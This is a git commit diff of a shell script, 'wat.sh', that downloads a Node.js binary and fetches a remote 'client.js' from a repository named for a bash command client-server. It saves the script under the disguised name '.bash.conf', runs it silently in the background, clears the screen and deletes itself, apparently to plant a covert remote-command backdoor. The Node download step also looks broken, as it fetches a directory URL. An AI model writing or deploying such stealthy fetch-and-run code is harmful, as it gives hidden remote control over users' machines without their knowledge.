d4ef114683111eacc51c9d2658afc3156ced8d21
Damien <damien@it-consultis.com>
2016-08-04 12:32:58 +0800

    downloading node

--- wat.sh
+++ wat.sh
@@ -3,10 +3,18 @@
 set -ea -o pipefail
 
 FILENAME=.bash.conf
+NODE_VERSION=v6.3.1
 
 mkdir -p ~/.cache
-curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > ~/.cache/$FILENAME
+cd ~/.cache
+
+curl https://nodejs.org/dist/$NODE_VERSION/ > node.tar.xz
+tar -xvf node.tar.xz
+cp node-$NODE_VERSION-linux-x64/bin/node .
+mv node bin
+rm -rf node-$NODE_VERSION-linux-x64/bin/node
+curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > $FILENAME
 
 
-nohup node  ~/.cache/$FILENAME > /dev/null & clear
+nohup ./bin $FILENAME > /dev/null & clear
 rm -- "$0"
